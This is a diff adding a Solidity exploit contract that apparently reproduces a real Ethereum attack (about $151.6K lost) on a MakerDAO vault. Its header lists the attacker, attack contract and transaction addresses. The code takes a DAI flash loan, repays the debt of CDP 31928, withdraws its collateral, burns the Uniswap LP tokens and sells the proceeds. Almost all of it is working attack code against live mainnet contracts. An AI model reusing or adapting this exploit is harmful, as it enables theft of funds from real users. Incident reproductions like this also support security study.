@@ -1,0 +1,142 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.15;
+import "hardhat/console.sol";
+
+// @KeyInfo - Total Lost : ~$151.6K
+// Attacker : https://etherscan.io/address/0xdfdea277f6b44270bcb804997d1e6cc4ad8407db
+// Attack Contract : https://etherscan.io/address/0xfd51531b26f9be08240f7459eea5be80d5b047d9
+// Vulnerable Contract : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5
+// Attack Tx : https://etherscan.io/tx/0xf1818f62c635e5c80ef16b7857da812c74ce330ebed46682b4d173bffe84c666
+
+// @Info
+// Vulnerable Contract Code : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5#code
+
+// @Analysis
+// Post-mortem : https://app.blocksec.com/explorer/tx/eth/0xf1818f62c635e5c80ef16b7857da812c74ce330ebed46682b4d173bffe84c666?line=74
+// Twitter Guy :
+// Hacking God :
+interface IERC20{
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address _owner) external view returns (uint256 balance);
+    function withdraw( uint requestedAmount) external;
+    function totalSupply() external view returns (uint256);
+}
+
+interface IMakerPool {
+    function flashLoan(address token, uint256 assets, bytes calldata data) external;
+}
+
+struct Urn {
+    uint256 ink; // Locked Collateral  [wad]
+    uint256 art; // Normalised Debt    [wad]
+}
+
+struct Ilk {
+    uint256 Art; // Total Normalised Debt     [wad]
+    uint256 rate; // Accumulated Rates         [ray]
+    uint256 spot; // Price with Safety Margin  [ray]
+    uint256 line; // Debt Ceiling              [rad]
+    uint256 dust; // Urn Debt Floor            [rad]
+}
+
+interface IMakerVat {
+    function urns(bytes32, address) external view returns (Urn memory);
+    function hope(
+        address
+    ) external;
+    function heal(
+        uint256
+    ) external;
+    function ilks(
+        bytes32
+    ) external view returns (Ilk memory);
+}
+
+interface IMakerManager {
+    function urns(
+        uint256
+    ) external view returns (address);
+    function join(address, uint256) external;
+    function flux(uint256, address, uint256) external;
+    function frob(uint256, int256, int256) external;
+    function open(bytes32, address) external returns (uint256);
+    function cdpAllow(uint256, address, uint256) external;
+}
+
+interface IUniv2 {
+    function exit(address, uint256) external;
+}
+
+interface IUniv2Token {
+    function burn(
+        address
+    ) external returns (uint256, uint256);
+}
+
+interface Mcd {
+    function sellGem(address, uint256) external;
+}
+
+contract Circle  {
+    address private constant maker = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
+    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
+    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+    address maker_cdp_manager = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;
+    address maker_mcd_join_dai = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;
+    address make_mcd_vat = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
+    address univ2 = 0xA81598667AC561986b70ae11bBE2dd5348ed4327;
+    address univ2_token = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5;
+    address mcd = 0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A;
+
+    address circle = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+    address allower = 0x0A59649758aa4d66E25f08Dd01271e891fe52199;
+
+
+    function fuck() public {
+        uint256 amount = 2400000*1e18;
+        bytes memory data =
+            "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
+        console.log("11111");
+        uint a = IMakerManager(maker_cdp_manager).open("0x001001001001",address(this));
+        console.log("[End] ",a);
+        IMakerPool(maker).flashLoan(dai, amount, data);
+        console.log("[End] Attacker Circle after exploit", IERC20(dai).balanceOf(address(this)), 6);
+    }
+
+    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external
+    {
+        console.log("22222");
+        address urns_address = IMakerManager(maker_cdp_manager).urns(31928);
+        Urn memory urn = IMakerVat(make_mcd_vat).urns(
+            "0x001001001001", urns_address
+        );
+        console.log("333");
+        Ilk memory ilk =
+            IMakerVat(make_mcd_vat).ilks("0x001001001001");
+
+        int256 dink = 0 - int256(urn.ink);
+        int256 dart = 0 - int256(urn.art);
+        console.log("444");
+        uint256 amount_dai = IERC20(dai).balanceOf(address(this));
+        IERC20(dai).approve(maker_mcd_join_dai, amount_dai);
+        console.log("555");
+        IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);
+        console.log("66");
+        IMakerManager(maker_cdp_manager).frob(31928, dink, dart);
+console.log("77");
+        IMakerManager(maker_cdp_manager).flux(31928, address(this), urn.ink);
+        IUniv2(univ2).exit(address(this), urn.ink);
+console.log("88");
+        IERC20(univ2_token).transfer(univ2_token, urn.ink);
+        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));
+
+        IERC20(circle).approve(allower, type(uint256).max);
+        Mcd(mcd).sellGem(address(this), IERC20(circle).balanceOf(address(this)));
+        IERC20(dai).approve(maker, type(uint256).max);
+    }
+}
